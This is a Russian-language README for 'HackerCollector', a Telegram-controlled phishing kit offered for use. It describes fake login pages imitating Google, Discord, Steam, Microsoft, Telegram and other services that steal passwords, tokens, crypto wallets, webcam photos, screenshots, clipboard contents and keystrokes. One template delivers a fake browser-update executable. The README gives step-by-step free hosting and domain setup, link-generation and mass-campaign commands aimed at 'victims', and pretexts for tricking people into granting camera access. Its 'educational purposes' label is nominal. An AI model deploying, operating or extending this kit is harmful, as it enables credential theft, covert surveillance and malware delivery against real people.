# 🕵️ HackerCollector

> Полностью бесплатный Telegram-бот для социальной инженерии.
> Один домен — любые ссылки работают. Данные жертвы — в твой Telegram.

---

## 📦 Возможности

- **16 шаблонов лендингов**: Cloudflare, Google, Discord, Steam, Instagram, Netflix, VK, Telegram, Microsoft, WhatsApp, Age Verify, Browser Update и др.
- **Авто-сбор**: IP + точная геолокация, фото с камеры, скриншот экрана, буфер обмена, Canvas/WebGL/AudioContext fingerprint, кейлоггер
- **Креды**: логин/пароль, email, телефон, токены, Discord-токены, Steam ID, криптокошельки
- **Живые уведомления**: всё приходит в Telegram мгновенно
- **Один домен — любые ссылки**: `/gen` → чистая ссылка, кидай жертве
- **Мульти-юзер**: каждый юзер бота получает свои ссылки, данные не путаются
- **Статистика**: дашборд, логи событий, экспорт в JSON
- **Discord webhook**: дублирование уведомлений
- **Гео-фенсы**: блокировка по странам

---

## 🚀 Быстрый старт (10 минут, 0 рублей)

### 1. Создай бота в Telegram

1. Открой `@BotFather` в Telegram
2. `/newbot` → выбери имя → получишь токен
3. Токен вставь в `config.py` → `BOT_TOKEN = "твой_токен"`

### 2. Залей на GitHub

```bash
# Создай репозиторий на GitHub (публичный или приватный)
# В терминале:
cd C:\Users\пк\Desktop\HackerBot
git init
git add .
git commit -m "HackerCollector v3.0"
git remote add origin https://github.com/твой-ник/HackerCollector.git
git push -u origin main
```

> ⚠️ `config.py` уже в `.gitignore` — токен не улетит в репозиторий.

### 3. Деплой на Render (бесплатно)

1. Зарегистрируйся на [render.com](https://render.com) (через GitHub — 2 клика)
2. Нажми **"New +" → Web Service**
3. Выбери репозиторий `HackerCollector`
4. Настройки:
   - **Name**: `hacker-collector` (любое)
   - **Region**: `Frankfurt` (Европа) или `Ohio` (США)
   - **Branch**: `main`
   - **Runtime**: `Python 3`
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `python server.py`
   - **Plan**: **Free** ✅
5. Нажми **"Create Web Service"**
6. Через 2-3 минуты сервер запустится
7. Скопируй URL: `https://hacker-collector.onrender.com`

> 🔁 Render бесплатный — сервер засыпает через 15 минут простоя.
> Создай монитор на [uptimerobot.com](https://uptimerobot.com) (бесплатно),
> пропиши URL сервера — он будет пинговать каждые 5 минут, сервер не уснёт.

### 4. Получи бесплатный домен (eu.cc)

1. Зайди на [eu.cc](https://eu.cc)
2. Зарегистрируйся
3. Создай домен: `твой-ник.eu.cc`
4. В разделе **DNS Management** добавь:

| Type | Name | Target | TTL |
|------|------|--------|-----|
| **CNAME** | `@` | `hacker-collector.onrender.com` | 3600 |

> Домен активируется за 1-5 минут.

### 5. Настрой бота

Напиши боту (найди его в Telegram по имени, которое дал в BotFather):

```
/start
```

Бот ответит. Теперь:

```
/domain твой-ник.eu.cc
```

Готово. Теперь любой путь на твоём домене работает как лендинг.

---

## 🎯 Использование

### Быстрая генерация (old school)

```
/gen                    → https://твой-ник.eu.cc/a1b2c3d4
/gen google             → https://твой-ник.eu.cc/a1b2c3d4  (шаблон Google)
/gen discord            → https://твой-ник.eu.cc/a1b2c3d4  (шаблон Discord)
/gen instagram          → https://твой-ник.eu.cc/a1b2c3d4  (шаблон Instagram)
```

Кидай любую ссылку жертве — данные придут в этот же чат.

### Команды

| Команда | Описание |
|---------|----------|
| `/start` | Главное меню |
| `/gen [шаблон]` | Создать ссылку в 1 клик |
| `/claim` | Закрепить домен за собой |
| `/domain <domain>` | Указать свой домен |
| `/list` | Список активных ссылок |
| `/stats` | Глобальная статистика |
| `/victim <id>` | Данные по ссылке |
| `/export <id>` | Экспорт жертв в JSON |
| `/webhook discord <url>` | Discord-уведомления |
| `/fence add <country>` | Заблокировать страну |
| `/campaign <name> <template> <count>` | Массовая генерация |

### Шаблоны

| Ключ | Название | Собирает |
|------|----------|----------|
| `cf` | Cloudflare Verify | IP, фото, скриншот, фингерпринт, кейлог |
| `google` | Google Login | IP, фото, скриншот, **email+пароль** |
| `discord` | Discord Login | IP, фото, скриншот, **email+пароль** |
| `steam` | Steam Login | IP, фото, скриншот, **логин+пароль** |
| `telegram` | Telegram Login | IP, фото, **номер телефона**, код |
| `instagram` | Instagram Login | IP, фото, скриншот, **логин+пароль** |
| `vk` | VK Login | IP, фото, скриншот, **телефон+пароль** |
| `netflix` | Netflix Login | IP, фото, скриншот, **email+пароль** |
| `microsoft` | Microsoft Login | IP, фото, скриншот, **email+пароль** |
| `whatsapp` | WhatsApp Web | IP, фото с камеры |
| `age` | Age Verify | **селфи**, возраст, скриншот |
| `update` | Browser Update (EXE) | IP, фото, скриншот (скачивает .exe) |

Каждый шаблон собирает **всё**: IP, гео, фото с камеры, скриншот, буфер обмена, Canvas/WebGL/AudioContext fingerprint, кейлоггер, инфо об устройстве.

---

## 🧠 Как работает камера (без подозрений)

Браузер всегда показывает диалог разрешения. Но жертва **сама хочет нажать Allow**:

- **Cloudflare**: "Безопасность требует подтверждения лицом"
- **Google**: "Второй фактор — быстрая верификация"
- **Age Verify**: "Подтвердите возраст — селфи"
- **Browser Update**: "Системе нужен доступ к камере для проверки"
- **WhatsApp Web**: "Отсканируйте QR код"

Кнопка всегда выглядит логично для пользователя. Она думает, что делает следующий шаг в легитимном процессе — а на самом деле разрешает камеру.

---

## 🛡 Стек (полностью бесплатный)

| Компонент | Сервис | Цена |
|-----------|--------|------|
| Сервер | Render.com | $0 |
| Домен | eu.cc | $0 |
| Бот | Telegram Bot API | $0 |
| Геолокация | ip-api.com free | $0 |
| Uptime монитор | UptimeRobot | $0 |
| База данных | SQLite | $0 |

---

## 🔧 Разработка

```bash
# Клонировать
git clone https://github.com/твой-ник/HackerCollector.git
cd HackerCollector

# Установить зависимости
pip install -r requirements.txt

# Настроить config.py
# BOT_TOKEN = "твой_токен"
# BASE_URL = "https://hacker-collector.onrender.com"

# Запустить локально
python server.py
```

Для теста локально используй [ngrok](https://ngrok.com):
```bash
ngrok http 8080
# → https://abc123.ngrok-free.app
# В config.py BASE_URL = "https://abc123.ngrok-free.app"
```

---

## ⚠️ Важно

- `config.py` **не коммитить** в GitHub (уже в `.gitignore`)
- Токен бота — только у тебя
- Все лендинги — статические HTML, не хранят данные на клиенте
- Данные жертв хранятся локально в `data.db`

---

## 📝 Лицензия

Для образовательных целей.
